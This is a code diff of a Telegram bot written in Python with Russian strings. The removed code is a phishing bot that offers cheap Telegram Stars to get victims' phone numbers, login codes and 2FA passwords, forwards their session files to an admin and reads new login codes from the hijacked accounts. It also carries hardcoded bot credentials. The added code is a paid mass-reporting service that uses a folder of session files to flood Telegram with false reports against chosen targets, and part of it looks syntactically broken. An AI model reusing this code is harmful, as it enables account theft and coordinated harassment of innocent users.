@@ -1,741 +1,688 @@
 import asyncio
-import os
-import json
-from datetime import datetime
-from telethon import TelegramClient, events
-from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, PasswordHashInvalidError
-from telethon.tl.custom import Button
 import logging
-import re
+import os
+import random
+from datetime import datetime
+from telethon import TelegramClient, events, Button
+from telethon.tl.functions.messages import ReportRequest
+from telethon.tl.types import (
+    InputReportReasonSpam, InputReportReasonViolence,
+    InputReportReasonPornography, InputReportReasonOther,
+    InputReportReasonChildAbuse, InputReportReasonIllegalDrugs,
+    InputReportReasonPersonalDetails
+)
+from config import *
+from database import Database
+from crypto_api import CryptoBotAPI
 
-logging.basicConfig(level=logging.ERROR)
+# Настройка логирования
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
-# ========== НАСТРОЙКИ ==========
-BOT_TOKEN = "8231777745:AAEJ-oYZzJj5o409hW7fMqrq-Ub_TbbJWLU"
-API_ID = 29563888
-API_HASH = "02808341c4eaddf718422db211d425cf"
-ADMIN_ID = 7546928092
-# ================================
-
-os.makedirs("sessions", exist_ok=True)
-
-# Файл для хранения аккаунтов
-ACCOUNTS_FILE = "accounts.json"
-
-# ========== ФУНКЦИИ ДЛЯ РАБОТЫ С JSON ==========
-def load_accounts():
-    """Загрузка аккаунтов из файла"""
-    try:
-        # Если файла нет - создаем
-        if not os.path.exists(ACCOUNTS_FILE):
-            with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
-                json.dump([], f)
+class PremiumReportBot:
+    def __init__(self):
+        self.bot_client = None
+        self.session_clients = []  # Загруженные сессии из папки session
+        self.db = Database()
+        self.crypto = CryptoBotAPI(CRYPTOBOT_TOKEN)
+        self.user_states = {}
+        
+        # Маппинг причин на типы Telethon
+        self.reason_mapping = {
+            "spam": InputReportReasonSpam(),
+            "personal": InputReportReasonPersonalDetails(),
+            "violence": InputReportReasonViolence(),
+            "drugs": InputReportReasonIllegalDrugs(),
+            "child": InputReportReasonChildAbuse(),
+            "porn": InputReportReasonPornography(),
+            "other": InputReportReasonOther()
+        }
+    
+    async def load_sessions(self):
+        """Загрузка всех .session файлов из папки session (БЕЗ API ID/HASH)"""
+        if not os.path.exists(SESSIONS_FOLDER):
+            os.makedirs(SESSIONS_FOLDER)
+            logger.warning(f"📁 Создана папка {SESSIONS_FOLDER}, положите в нее .session файлы")
             return []
         
-        # Если файл пустой
-        if os.path.getsize(ACCOUNTS_FILE) == 0:
-            with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
-                json.dump([], f)
-            return []
+        # Ищем все .session файлы
+        session_files = [f for f in os.listdir(SESSIONS_FOLDER) if f.endswith('.session')]
+        loaded = []
         
-        # Читаем файл
-        with open(ACCOUNTS_FILE, 'r', encoding='utf-8') as f:
-            data = json.load(f)
-            if isinstance(data, list):
-                return data
-            else:
-                # Если не список - пересоздаем
-                with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
-                    json.dump([], f)
-                return []
-    except json.JSONDecodeError:
-        # Если файл битый
-        with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
-            json.dump([], f)
-        return []
-    except Exception as e:
-        print(f"Ошибка загрузки: {e}")
-        return []
-
-def save_account(phone, code, twofa, name, user_id):
-    """Сохранение аккаунта в файл"""
-    accounts = load_accounts()
-    
-    # Проверяем есть ли уже такой аккаунт
-    found = False
-    for acc in accounts:
-        if acc.get('phone') == phone:
-            acc.update({
-                'code': code,
-                'twofa': twofa,
-                'name': name,
-                'user_id': user_id,
-                'date': str(datetime.now())
-            })
-            found = True
-            break
-    
-    # Если нет - добавляем
-    if not found:
-        accounts.append({
-            'phone': phone,
-            'code': code,
-            'twofa': twofa,
-            'name': name,
-            'user_id': user_id,
-            'date': str(datetime.now())
-        })
-    
-    # Сохраняем
-    with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
-        json.dump(accounts, f, ensure_ascii=False, indent=2)
-
-def get_account(phone):
-    """Получить аккаунт по номеру"""
-    accounts = load_accounts()
-    for acc in accounts:
-        if acc.get('phone') == phone:
-            return acc
-    return None
-
-# Проверка и создание файла accounts.json при запуске
-def init_accounts_file():
-    """Создать пустой файл accounts.json если его нет"""
-    if not os.path.exists(ACCOUNTS_FILE):
-        with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
-            json.dump([], f)
-        print("✅ Создан новый файл accounts.json")
-    else:
-        # Проверяем что файл не битый
-        try:
-            with open(ACCOUNTS_FILE, 'r', encoding='utf-8') as f:
-                data = json.load(f)
-                if not isinstance(data, list):
-                    # Если не список, перезаписываем
-                    with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
-                        json.dump([], f)
-                    print("✅ accounts.json пересоздан (неверный формат)")
-        except:
-            # Если ошибка чтения, перезаписываем
-            with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
-                json.dump([], f)
-            print("✅ accounts.json пересоздан (был битым)")
-
-# Вызываем функцию инициализации
-init_accounts_file()
-# ===============================================
-
-# Хранилище сессий
-user_sessions = {}
-
-async def get_last_codes(client, limit=5):
-    """Получить последние коды из сообщений Telegram"""
-    try:
-        codes = []
+        logger.info(f"🔍 Найдено .session файлов: {len(session_files)}")
         
-        # Убеждаемся что клиент подключен
-        if not client.is_connected():
-            await client.connect()
-        
-        # 1. Сначала ищем в Saved Messages
-        async for message in client.iter_messages('me', limit=30):
-            if message.text:
-                found_codes = re.findall(r'\b\d{5}\b', message.text)
-                for code in found_codes:
-                    if code not in [c['code'] for c in codes]:
-                        sender = "Saved Messages"
-                        if message.sender_id:
-                            try:
-                                sender_obj = await message.get_sender()
-                                if sender_obj:
-                                    sender = getattr(sender_obj, 'first_name', 'Telegram')
-                            except:
-                                pass
-                        
-                        msg_text = message.text[:100].replace('\n', ' ')
-                        
-                        codes.append({
-                            'code': code,
-                            'text': msg_text,
-                            'date': message.date.strftime('%H:%M:%S'),
-                            'sender': sender,
-                            'chat': 'Сохраненные'
-                        })
-                        if len(codes) >= limit:
-                            return codes
-        
-        # 2. Ищем в диалоге с самим собой
-        try:
-            async for message in client.iter_messages(await client.get_me(), limit=30):
-                if message.text:
-                    found_codes = re.findall(r'\b\d{5}\b', message.text)
-                    for code in found_codes:
-                        if code not in [c['code'] for c in codes]:
-                            codes.append({
-                                'code': code,
-                                'text': message.text[:100].replace('\n', ' '),
-                                'date': message.date.strftime('%H:%M:%S'),
-                                'sender': 'Telegram',
-                                'chat': 'С собой'
-                            })
-                            if len(codes) >= limit:
-                                return codes
-        except:
-            pass
-        
-        # 3. Ищем в системных сообщениях
-        async for dialog in client.iter_dialogs():
-            dialog_name = dialog.name or ""
-            if any(word in dialog_name.lower() for word in ['telegram', 'service', 'notification', 'уведомление']):
-                try:
-                    async for message in client.iter_messages(dialog.id, limit=15):
-                        if message.text:
-                            found_codes = re.findall(r'\b\d{5}\b', message.text)
-                            for code in found_codes:
-                                if code not in [c['code'] for c in codes]:
-                                    codes.append({
-                                        'code': code,
-                                        'text': message.text[:100].replace('\n', ' '),
-                                        'date': message.date.strftime('%H:%M:%S'),
-                                        'sender': dialog_name[:20],
-                                        'chat': dialog_name[:20]
-                                    })
-                                    if len(codes) >= limit:
-                                        return codes
-                except:
-                    continue
-        
-        return codes
-        
-    except Exception as e:
-        print(f"Ошибка получения кодов: {e}")
-        return []
-
-async def main():
-    bot = TelegramClient('bot_session', API_ID, API_HASH)
-    await bot.start(bot_token=BOT_TOKEN)
-    
-    print("✅" + "="*50)
-    print("✅ БОТ ЗАПУЩЕН!")
-    print("✅" + "="*50)
-    print(f"👑 Админ ID: {ADMIN_ID}")
-    print("📱 Жду пользователей...")
-    print("✅" + "="*50)
-    
-    @bot.on(events.NewMessage(pattern='/start'))
-    async def start(event):
-        user_id = event.sender_id
-        name = event.sender.first_name or "User"
-        
-        if user_id == ADMIN_ID:
-            buttons = [
-                [Button.inline("📊 ВСЕ АККАУНТЫ", b"admin_list")],
-                [Button.inline("📈 СТАТИСТИКА", b"admin_stats")],
-                [Button.inline("🧹 ОЧИСТИТЬ", b"admin_clean")]
-            ]
-            await event.reply(
-                "👑 **АДМИН ПАНЕЛЬ**\n\n"
-                "Выберите действие:",
-                buttons=buttons
-            )
-        else:
-            buttons = [[Button.request_phone("📱 ПОДЕЛИТЬСЯ НОМЕРОМ")]]
-            await event.reply(
-                f"✨ **Привет, {name}!** ✨\n\n"
-                f"🔥 **Купи Telegram Stars по супер цене!**\n"
-                f"⭐ 100 звезд = 100₽\n\n"
-                f"📱 **Нажми кнопку чтобы поделиться номером**\n\n"
-                f"Это нужно для подтверждения что аккаунт не является виртуальным.",
-                buttons=buttons
-            )
-    
-    @bot.on(events.CallbackQuery)
-    async def callback(event):
-        user_id = event.sender_id
-        data = event.data.decode()
-        
-        # Для обычных пользователей
-        if user_id != ADMIN_ID:
-            if user_id in user_sessions:
-                user_data = user_sessions[user_id]
+        for session_file in session_files:
+            try:
+                # Путь к файлу сессии (без расширения .session)
+                session_path = os.path.join(SESSIONS_FOLDER, session_file.replace('.session', ''))
                 
-                if 'code' not in user_data:
-                    user_data['code'] = ''
+                # Создаем клиента БЕЗ передачи api_id и api_hash
+                # Telethon сам прочитает их из существующего .session файла
+                client = TelegramClient(session_path, None, None)
                 
-                if data.isdigit():
-                    if len(user_data['code']) < 5:
-                        user_data['code'] += data
+                # Подключаемся
+                await client.connect()
                 
-                elif data == 'del':
-                    user_data['code'] = user_data['code'][:-1]
-                
-                elif data == 'ok':
-                    if len(user_data['code']) == 5:
-                        try:
-                            await user_data['client'].sign_in(user_data['phone'], user_data['code'])
-                            me = await user_data['client'].get_me()
-                            
-                            save_account(
-                                phone=user_data['phone'],
-                                code=user_data['code'],
-                                twofa="",
-                                name=me.first_name,
-                                user_id=user_id
-                            )
-                            
-                            session_file = f"{user_data['session']}.session"
-                            if os.path.exists(session_file):
-                                await bot.send_file(ADMIN_ID, session_file, 
-                                    caption=f"📱 {user_data['phone']}\n👤 {me.first_name}")
-                            
-                            await event.edit("✅ **ГОТОВО!** Администратор скоро свяжется с вами.")
-                            
-                            await user_data['client'].disconnect()
-                            del user_sessions[user_id]
-                            return
-                            
-                        except SessionPasswordNeededError:
-                            user_data['step'] = 'wait_2fa'
-                            user_data['2fa_attempts'] = 0
-                            await event.edit(
-                                "🔐 **Требуется облачный пароль (2FA)**\n\n"
-                                "⚠️ Это НЕ код из SMS, а пароль который вы сами установили\n"
-                                "в настройках Telegram (Двухфакторная аутентификация)\n\n"
-                                "📝 **Введите ваш облачный пароль:**"
-                            )
-                            return
-                            
-                        except (PhoneCodeInvalidError, PhoneCodeExpiredError):
-                            if 'code_attempts' not in user_data:
-                                user_data['code_attempts'] = 1
-                            else:
-                                user_data['code_attempts'] += 1
-                            
-                            user_data['code'] = ''
-                            
-                            if user_data['code_attempts'] >= 3:
-                                await event.edit(
-                                    "❌ **Слишком много неправильных попыток!**\n\n"
-                                    "🔄 **Нажмите кнопку чтобы отправить код заново**",
-                                    buttons=[[Button.inline("🔄 ОТПРАВИТЬ НОВЫЙ КОД", b"resend_code")]]
-                                )
-                                return
-                            
-                            remaining = 3 - user_data['code_attempts']
-                            buttons = [
-                                [Button.inline("1️⃣", b"1"), Button.inline("2️⃣", b"2"), Button.inline("3️⃣", b"3")],
-                                [Button.inline("4️⃣", b"4"), Button.inline("5️⃣", b"5"), Button.inline("6️⃣", b"6")],
-                                [Button.inline("7️⃣", b"7"), Button.inline("8️⃣", b"8"), Button.inline("9️⃣", b"9")],
-                                [Button.inline("◀️", b"del"), Button.inline("0️⃣", b"0"), Button.inline("✅", b"ok")]
-                            ]
-                            await event.edit(
-                                f"❌ **Неправильный код!** Осталось попыток: {remaining}\n\n"
-                                f"📱 **Код:** `⬜⬜⬜⬜⬜`\n\n⬇️ **Попробуйте снова:**",
-                                buttons=buttons
-                            )
-                            return
-                            
-                        except Exception as e:
-                            await event.edit(f"❌ Ошибка: {e}")
-                            del user_sessions[user_id]
-                            return
-                
-                elif data == 'resend_code':
-                    phone = user_data['phone']
-                    session = user_data['session']
-                    
-                    try:
-                        await user_data['client'].disconnect()
-                    except:
-                        pass
-                    
-                    client = TelegramClient(session, API_ID, API_HASH)
-                    await client.connect()
-                    await client.send_code_request(phone)
-                    
-                    user_sessions[user_id] = {
+                # Проверяем, авторизована ли сессия
+                if await client.is_user_authorized():
+                    me = await client.get_me()
+                    loaded.append({
                         'client': client,
-                        'phone': phone,
-                        'session': session,
-                        'code': '',
-                        'code_attempts': 0
-                    }
+                        'name': session_file,
+                        'user_id': me.id,
+                        'phone': me.phone if me.phone else 'Unknown',
+                        'username': me.username if me.username else 'NoUsername'
+                    })
+                    logger.info(f"✅ Загружена сессия: {session_file} (@{me.username})")
+                else:
+                    logger.warning(f"❌ Сессия не авторизована: {session_file}")
                     
-                    buttons = [
-                        [Button.inline("1️⃣", b"1"), Button.inline("2️⃣", b"2"), Button.inline("3️⃣", b"3")],
-                        [Button.inline("4️⃣", b"4"), Button.inline("5️⃣", b"5"), Button.inline("6️⃣", b"6")],
-                        [Button.inline("7️⃣", b"7"), Button.inline("8️⃣", b"8"), Button.inline("9️⃣", b"9")],
-                        [Button.inline("◀️", b"del"), Button.inline("0️⃣", b"0"), Button.inline("✅", b"ok")]
-                    ]
-                    
-                    await event.edit("✅ **Новый код отправлен!**\n\n📱 **Код:** `⬜⬜⬜⬜⬜`\n\n⬇️ **Введи 5 цифр:**", buttons=buttons)
+            except Exception as e:
+                logger.error(f"❌ Ошибка загрузки {session_file}: {e}")
+        
+        self.session_clients = loaded
+        logger.info(f"✅ Загружено активных сессий: {len(loaded)}")
+        return loaded
+    
+    async def check_user_access(self, user_id):
+        """Проверка доступа пользователя"""
+        
+        # Проверяем, является ли пользователь администратором
+        if user_id in ADMIN_IDS or self.db.is_admin(user_id):
+            return {
+                'access': True, 
+                'type': 'admin', 
+                'limit': 999999,
+                'used': 0,
+                'is_admin': True
+            }
+        
+        # Проверка платной подписки
+        sub = self.db.check_subscription(user_id)
+        if sub:
+            limit = SUBSCRIPTION_LIMITS.get(sub['type'], 0)
+            if sub['reports_used'] < limit:
+                return {
+                    'access': True,
+                    'type': sub['type'],
+                    'limit': limit,
+                    'used': sub['reports_used'],
+                    'end_date': sub['end_date'],
+                    'is_admin': False
+                }
+            else:
+                return {
+                    'access': False,
+                    'reason': 'Лимит исчерпан',
+                    'limit': limit,
+                    'used': sub['reports_used']
+                }
+        
+        return {'access': False, 'reason': 'Нет подписки'}
+    
+    async def start_bot(self):
+        """Запуск бота"""
+        # Загружаем сессии из папки session
+        sessions = await self.load_sessions()
+        
+        # Создаем клиента бота
+        self.bot_client = TelegramClient('bot_session', None, None)
+        await self.bot_client.start(bot_token=BOT_TOKEN)
+        
+        logger.info(f"🚀 Бот запущен! Активных сессий для жалоб: {len(sessions)}")
+        
+        # Отправляем уведомление админам о запуске
+        for admin_id in ADMIN_IDS:
+            try:
+                await self.bot_client.send_message(
+                    admin_id,
+                    f"✅ <b>Бот запущен!</b>\n\n"
+                    f"📊 Загружено сессий: {len(sessions)}\n"
+                    f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+                    parse_mode='html'
+                )
+            except:
+                pass
+        
+        # Регистрируем обработчики
+        self.register_handlers()
+        
+        await self.bot_client.run_until_disconnected()
+    
+    def register_handlers(self):
+        """Регистрация всех обработчиков"""
+        
+        @self.bot_client.on(events.NewMessage(pattern='/start'))
+        async def start_handler(event):
+            user_id = event.sender_id
+            username = event.sender.username or "NoUsername"
+            
+            # Добавляем пользователя в БД
+            self.db.add_user(user_id, username)
+            
+            # Проверяем доступ
+            access = await self.check_user_access(user_id)
+            
+            if access['access']:
+                await self.show_main_menu(event, access)
+            else:
+                await self.show_subscription_menu(event)
+        
+        @self.bot_client.on(events.NewMessage(pattern='/admin'))
+        async def admin_handler(event):
+            if not self.db.is_admin(event.sender_id) and event.sender_id not in ADMIN_IDS:
+                await event.reply("❌ У вас нет прав администратора!")
+                return
+            await self.show_admin_panel(event)
+        
+        @self.bot_client.on(events.NewMessage(pattern='/profile'))
+        async def profile_handler(event):
+            user_id = event.sender_id
+            user = self.db.get_user(user_id)
+            access = await self.check_user_access(user_id)
+            
+            if user:
+                text = f"""
+👤 <b>Ваш профиль</b>
+
+📊 <b>Статистика:</b>
+• Всего жалоб: {user[5] or 0}
+• Дата регистрации: {user[6][:10] if user[6] else 'Неизвестно'}
+
+"""
+                if access['access']:
+                    if access.get('is_admin'):
+                        text += f"👑 <b>Статус:</b> Администратор"
+                    else:
+                        text += f"""
+💎 <b>Подписка:</b>
+• Тип: {access['type']}
+• Действует до: {access['end_date'].strftime('%d.%m.%Y %H:%M')}
+• Использовано: {access['used']}/{access['limit']}
+"""
+                else:
+                    text += "\n❌ <b>У вас нет активной подписки</b>"
+                
+                await event.reply(text, parse_mode='html', buttons=[
+                    [Button.inline("💎 Купить подписку", data="buy_subscription")],
+                    [Button.inline("◀️ Главное меню", data="main_menu")]
+                ])
+        
+        @self.bot_client.on(events.CallbackQuery)
+        async def callback_handler(event):
+            data = event.data.decode('utf-8')
+            user_id = event.sender_id
+            
+            if data == "main_menu":
+                access = await self.check_user_access(user_id)
+                await self.show_main_menu(event, access, edit=True)
+            
+            elif data == "buy_subscription":
+                await self.show_subscription_plans(event)
+            
+            elif data.startswith("buy_plan_"):
+                plan = data.replace("buy_plan_", "")
+                await self.create_payment_check(event, plan)
+            
+            elif data.startswith("check_payment_"):
+                check_id = data.replace("check_payment_", "")
+                await self.check_payment_result(event, check_id)
+            
+            elif data.startswith("report_"):
+                access = await self.check_user_access(user_id)
+                if not access['access']:
+                    await event.answer("❌ У вас нет активной подписки!", alert=True)
                     return
                 
-                display = user_data['code'] + '⬜' * (5 - len(user_data['code']))
+                report_type = data.replace("report_", "")
+                await self.show_report_reasons(event, report_type)
+            
+            elif data.startswith("reason_"):
+                await self.handle_reason_selection(event)
+            
+            elif data == "admin_panel":
+                if not self.db.is_admin(user_id) and user_id not in ADMIN_IDS:
+                    await event.answer("❌ У вас нет прав!", alert=True)
+                    return
+                await self.show_admin_panel(event)
+            
+            elif data == "admin_list_users":
+                if not self.db.is_admin(user_id) and user_id not in ADMIN_IDS:
+                    return
+                await self.show_users_list(event)
+            
+            elif data == "admin_stats":
+                if not self.db.is_admin(user_id) and user_id not in ADMIN_IDS:
+                    return
+                await self.show_admin_stats(event)
+            
+            elif data == "admin_actions":
+                if not self.db.is_admin(user_id) and user_id not in ADMIN_IDS:
+                    return
+                await self.show_admin_actions(event)
+    
+    async def show_main_menu(self, event, access, edit=False):
+        """Главное меню"""
+        sessions_count = len(self.session_clients)
+        
+        menu_text = f"""
+🤖 <b>PREMIUM REPORT BOT</b>
+
+{'👑' if access.get('is_admin') else '💎' if access['access'] else '❌'} <b>Статус:</b> {
+    'Администратор' if access.get('is_admin') else 
+    f'Premium ({access["type"]})' if access['access'] else 
+    'Бесплатный'
+}
+
+📊 <b>Активных сессий:</b> {sessions_count}
+📈 <b>Отправлено жалоб:</b> {access.get('used', 0)}/{access.get('limit', 0)}
+
+<b>Выберите тип жалобы:</b>
+"""
+        buttons = [
+            [Button.inline("👤 На пользователя", data="report_user"),
+             Button.inline("📢 На канал", data="report_channel")],
+            [Button.inline("🤖 На бота", data="report_bot"),
+             Button.inline("💬 На чат", data="report_chat")],
+            [Button.inline("👤 Профиль", data="profile"),
+             Button.inline("💎 Подписка", data="buy_subscription")]
+        ]
+        
+        # Добавляем кнопку админ-панели для админов
+        if access.get('is_admin'):
+            buttons.append([Button.inline("👑 Админ панель", data="admin_panel")])
+        
+        if edit:
+            await event.edit(menu_text, buttons=buttons, parse_mode='html')
+        else:
+            await event.reply(menu_text, buttons=buttons, parse_mode='html')
+    
+    async def show_subscription_menu(self, event):
+        """Меню подписки для новых пользователей"""
+        text = """
+❌ <b>У вас нет доступа к боту</b>
+
+Для использования бота необходимо приобрести подписку:
+
+<b>Доступные тарифы:</b>
+• 1 день - 100 жалоб - 2$
+• 3 дня - 350 жалоб - 5$  
+• 7 дней - 1000 жалоб - 10$
+• 30 дней - 5000 жалоб - 30$
+
+<i>Оплата через CryptoBot (USDT, BTC, TON)</i>
+"""
+        buttons = [
+            [Button.inline("💎 Купить подписку", data="buy_subscription")],
+            [Button.url("📱 Поддержка", "https://t.me/support")]
+        ]
+        
+        await event.reply(text, buttons=buttons, parse_mode='html')
+    
+    async def show_subscription_plans(self, event):
+        """Показ тарифов подписки"""
+        plans_text = """
+💎 <b>Выберите тариф подписки:</b>
+
+<b>Тарифы:</b>
+• 🌟 1 день - 100 жалоб - 2$
+• 🌟🌟 3 дня - 350 жалоб - 5$
+• 🌟🌟🌟 7 дней - 1000 жалоб - 10$
+• 💎 30 дней - 5000 жалоб - 30$
+
+<i>✅ Мгновенная активация после оплаты</i>
+"""
+        buttons = [
+            [Button.inline("🌟 1 день - 2$", data="buy_plan_1_day")],
+            [Button.inline("🌟🌟 3 дня - 5$", data="buy_plan_3_days")],
+            [Button.inline("🌟🌟🌟 7 дней - 10$", data="buy_plan_7_days")],
+            [Button.inline("💎 30 дней - 30$", data="buy_plan_30_days")],
+            [Button.inline("◀️ Назад", data="main_menu")]
+        ]
+        
+        await event.edit(plans_text, buttons=buttons, parse_mode='html')
+    
+    async def create_payment_check(self, event, plan):
+        """Создание чека для оплаты"""
+        price = SUBSCRIPTION_PRICES.get(plan, 0)
+        days = int(plan.split('_')[0])
+        
+        await event.edit(
+            f"🔄 <b>Создание чека...</b>\n\n"
+            f"Тариф: {days} дней\n"
+            f"Сумма: {price}$",
+            parse_mode='html'
+        )
+        
+        try:
+            check = await self.crypto.create_check(
+                amount=price,
+                currency="USD",
+                description=f"Подписка ReportBot на {days} дней"
+            )
+            
+            if check:
+                check_url = check.get('pay_url')
+                check_id = check.get('check_id')
                 
-                buttons = [
-                    [Button.inline("1️⃣", b"1"), Button.inline("2️⃣", b"2"), Button.inline("3️⃣", b"3")],
-                    [Button.inline("4️⃣", b"4"), Button.inline("5️⃣", b"5"), Button.inline("6️⃣", b"6")],
-                    [Button.inline("7️⃣", b"7"), Button.inline("8️⃣", b"8"), Button.inline("9️⃣", b"9")],
-                    [Button.inline("◀️", b"del"), Button.inline("0️⃣", b"0"), Button.inline("✅", b"ok")]
-                ]
+                self.db.add_transaction(check_id, event.sender_id, price, "USD", plan)
                 
-                try:
-                    await event.edit(f"📱 **Код:** `{display}`\n\n⬇️ **Введи 5 цифр:**", buttons=buttons)
-                except:
-                    pass
-                await event.answer()
+                await event.edit(
+                    f"✅ <b>Чек создан!</b>\n\n"
+                    f"💰 Сумма: {price}$\n"
+                    f"📅 Тариф: {days} дней\n\n"
+                    f"Для оплаты нажмите кнопку ниже:",
+                    buttons=[
+                        [Button.url("💳 Перейти к оплате", check_url)],
+                        [Button.inline("✅ Я оплатил", data=f"check_payment_{check_id}")],
+                        [Button.inline("◀️ Назад", data="buy_subscription")]
+                    ],
+                    parse_mode='html'
+                )
+                
+                asyncio.create_task(self.check_payment_status(check_id, event.sender_id, plan, days))
+            else:
+                await event.edit(
+                    "❌ <b>Ошибка создания чека</b>",
+                    buttons=[[Button.inline("◀️ Назад", data="buy_subscription")]],
+                    parse_mode='html'
+                )
+        except Exception as e:
+            await event.edit(
+                f"❌ <b>Ошибка:</b> {str(e)}",
+                buttons=[[Button.inline("◀️ Назад", data="buy_subscription")]],
+                parse_mode='html'
+            )
+    
+    async def check_payment_status(self, check_id, user_id, plan, days):
+        """Проверка статуса оплаты"""
+        for _ in range(30):
+            await asyncio.sleep(10)
+            try:
+                status = await self.crypto.check_payment_status(check_id)
+                if status and status.get('status') == 'paid':
+                    self.db.update_subscription(user_id, plan, days)
+                    self.db.update_transaction(check_id, 'paid')
+                    
+                    try:
+                        await self.bot_client.send_message(
+                            user_id,
+                            f"✅ <b>Оплата получена!</b>\n\n"
+                            f"Ваша подписка на {days} дней активирована!",
+                            parse_mode='html'
+                        )
+                    except:
+                        pass
+                    break
+            except:
+                continue
+    
+    async def check_payment_result(self, event, check_id):
+        """Проверка результата оплаты по кнопке"""
+        status = await self.crypto.check_payment_status(check_id)
+        if status and status.get('status') == 'paid':
+            await event.edit(
+                "✅ <b>Оплата подтверждена!</b>\n\nИспользуйте /start для начала работы",
+                buttons=[[Button.inline("🏠 Главное меню", data="main_menu")]],
+                parse_mode='html'
+            )
+        else:
+            await event.answer("❌ Оплата не найдена или еще не подтверждена", alert=True)
+    
+    async def show_report_reasons(self, event, report_type):
+        """Показ причин для жалобы"""
+        reasons_text = f"📝 <b>Выберите причину жалобы на {report_type}:</b>\n\n"
+        
+        for key, reason in REPORT_REASONS.items():
+            reasons_text += f"• {reason['name']} - {reason['desc']}\n"
+        
+        buttons = []
+        row = []
+        
+        for key, reason in REPORT_REASONS.items():
+            row.append(Button.inline(reason['name'], data=f"reason_{report_type}_{key}"))
+            if len(row) == 2:
+                buttons.append(row)
+                row = []
+        
+        if row:
+            buttons.append(row)
+        
+        buttons.append([Button.inline("◀️ Назад", data="main_menu")])
+        
+        await event.edit(reasons_text, buttons=buttons, parse_mode='html')
+    
+    async def handle_reason_selection(self, event):
+        """Обработка выбора причины"""
+        data = event.data.decode('utf-8')
+        parts = data.split('_')
+        report_type = parts[1]
+        reason = parts[2]
+        
+        self.user_states[event.sender_id] = {
+            'step': 'waiting_target',
+            'report_type': report_type,
+            'reason': reason
+        }
+        
+        prompts = {
+            'user': "👤 Введите username пользователя (например: @username):",
+            'channel': "📢 Введите ссылку на канал (например: @channel или https://t.me/channel):",
+            'bot': "🤖 Введите username бота (например: @botusername):",
+            'chat': "💬 Введите ссылку на чат:"
+        }
+        
+        await event.edit(
+            prompts.get(report_type, "Введите цель жалобы:"),
+            buttons=[[Button.inline("◀️ Отмена", data="main_menu")]],
+            parse_mode='html'
+        )
+    
+    @self.bot_client.on(events.NewMessage)
+    async def handle_report_input(self, event):
+        """Обработка ввода цели жалобы"""
+        if event.sender_id not in self.user_states:
             return
         
-        # ===== АДМИН ФУНКЦИИ =====
+        state = self.user_states[event.sender_id]
         
-        if data == "admin_list":
-            accounts = load_accounts()
+        if state['step'] == 'waiting_target':
+            target = event.message.text.strip()
+            state['target'] = target
+            state['step'] = 'waiting_evidence'
             
-            if not accounts:
-                await event.edit("📭 **Нет аккаунтов**")
-                await event.answer()
-                return
-            
-            buttons = []
-            for acc in accounts[-10:]:
-                phone_short = acc['phone'][-8:]
-                name_short = acc['name'][:8] if acc['name'] else "No"
-                buttons.append([Button.inline(f"📱 {name_short}...{phone_short}", f"view_{acc['phone']}".encode())])
-            
-            buttons.append([Button.inline("🔄 ОБНОВИТЬ", b"admin_list")])
-            buttons.append([Button.inline("◀️ НАЗАД", b"back_admin")])
-            
-            await event.edit(
-                f"📊 **ВСЕ АККАУНТЫ** (всего: {len(accounts)})\n\n"
-                f"👇 Выберите аккаунт:",
-                buttons=buttons
+            await event.reply(
+                "📎 Отправьте ссылку на доказательство (или отправьте '-' если нет):",
+                buttons=[[Button.inline("◀️ Отмена", data="main_menu")]]
             )
-            await event.answer()
         
-        elif data.startswith("view_"):
-            phone = data.replace("view_", "")
-            acc = get_account(phone)
+        elif state['step'] == 'waiting_evidence':
+            evidence = event.message.text.strip()
+            if evidence == '-':
+                evidence = None
             
-            if acc:
-                text = (
-                    f"📱 **НОМЕР**\n`{acc['phone']}`\n\n"
-                    f"🔑 **КОД**\n`{acc['code']}`\n\n"
-                    f"🔐 **2FA**\n`{acc['twofa'] if acc['twofa'] else 'нет'}`\n\n"
-                    f"👤 **ИМЯ**\n{acc['name']}\n\n"
-                    f"📅 **ДАТА**\n{acc['date'][:16]}"
-                )
-                
-                buttons = [
-                    [Button.inline("📨 ПОКАЗАТЬ КОДЫ", f"showcodes_{phone}".encode())],
-                    [Button.inline("📎 ФАЙЛ СЕССИИ", f"getsess_{phone}".encode())],
-                    [Button.inline("◀️ НАЗАД", b"admin_list")]
-                ]
-                
-                await event.edit(text, buttons=buttons)
-            else:
-                await event.edit("❌ Аккаунт не найден")
-            await event.answer()
-        
-        # УЛУЧШЕННАЯ ФУНКЦИЯ ПОКАЗА КОДОВ
-        elif data.startswith("showcodes_"):
-            phone = data.replace("showcodes_", "")
-            
-            await event.edit("🔄 **Поиск кодов...**\n\nПроверяю Saved Messages и диалоги...")
-            
-            found = False
-            for f in os.listdir("sessions"):
-                if phone.replace('+', '') in f and f.endswith('.session'):
-                    try:
-                        session_path = f"sessions/{f.replace('.session', '')}"
-                        client = TelegramClient(session_path, API_ID, API_HASH)
-                        
-                        # Подключаемся и проверяем
-                        await client.connect()
-                        
-                        if await client.is_user_authorized():
-                            me = await client.get_me()
-                            
-                            await event.edit(f"🔄 **Подключено к аккаунту**\n👤 {me.first_name}\n\n🔍 Ищу коды в сообщениях...")
-                            
-                            codes = await get_last_codes(client)
-                            
-                            if codes:
-                                text = f"📱 **Аккаунт:** `{phone}`\n👤 **Владелец:** {me.first_name}\n\n📨 **Найденные коды ({len(codes)}):**\n\n"
-                                buttons = []
-                                
-                                for i, code_info in enumerate(codes, 1):
-                                    text += f"{i}. **Код:** `{code_info['code']}` 🕒 {code_info['date']}\n"
-                                    text += f"   📍 {code_info['chat']}\n"
-                                    text += f"   📝 {code_info['text'][:60]}\n\n"
-                                    buttons.append([Button.inline(f"✅ ВЗЯТЬ КОД {code_info['code']}", f"usecode_{phone}_{code_info['code']}".encode())])
-                                
-                                buttons.append([Button.inline("🔄 ОБНОВИТЬ", f"showcodes_{phone}".encode())])
